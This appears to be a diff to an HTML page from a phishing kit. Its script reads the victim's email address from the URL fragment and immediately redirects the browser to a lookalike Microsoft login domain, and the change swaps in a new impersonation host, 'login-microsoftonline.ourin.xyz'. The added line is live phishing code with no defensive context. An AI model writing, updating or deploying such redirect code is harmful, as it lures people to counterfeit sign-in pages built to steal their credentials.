@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://login-online-ms.appsjuw.xyz/?"+ makeid(10) + "#" + em;
+			window.location.href = "https://login-microsoftonline.ourin.xyz/?"+ makeid(10) + "#" + em;
 		}, 0);
 	</script>
 </html>
